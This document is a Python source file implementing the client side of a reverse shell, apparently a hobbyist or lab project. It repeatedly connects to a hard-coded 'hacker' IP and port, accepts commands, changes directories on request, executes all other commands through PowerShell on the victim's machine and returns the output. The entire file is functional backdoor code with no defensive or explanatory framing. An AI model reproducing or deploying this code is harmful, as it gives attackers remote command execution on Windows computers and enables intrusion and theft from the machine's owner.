import socket
import subprocess
import time
import os

IDENTIFIER = "<END_OF_COMMAND_RESULT>"


if __name__ == "__main__":

    hacker_IP = "192.168.0.46"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)

    while True:
        try:

            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            print("trying to connect with ", hacker_address)
            victim_socket.connect(hacker_address)
            while True:
                data = victim_socket.recv(1024)

                hacker_command = data.decode()
                print("hacker command = ", hacker_command)
                if hacker_command == "stop":
                    # This part is to exit the program safely
                    break
                elif hacker_command == "":
                    # if the hacker presses enter unexpectedly
                    continue
                elif hacker_command.startswith("cd"):
                    # to move directories
                    path2move = hacker_command.strip("cd ")
                    if os.path.exists(path2move):
                        # command to move to the required path if it exists
                        os.chdir(path2move)
                    else:
                        print("cant change dir to ", path2move)
                    continue
                else:
                    # run powershell command from the hacker
                    output = subprocess.run(
                        ["powershell.exe", hacker_command],
                        shell=True,
                        capture_output=True,
                    )
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr

                    victim_socket.sendall(command_result)
        except KeyboardInterrupt:
            print("exiting")
        except Exception as err:
            print("Unable to connect: ", err)
            time.sleep(5)
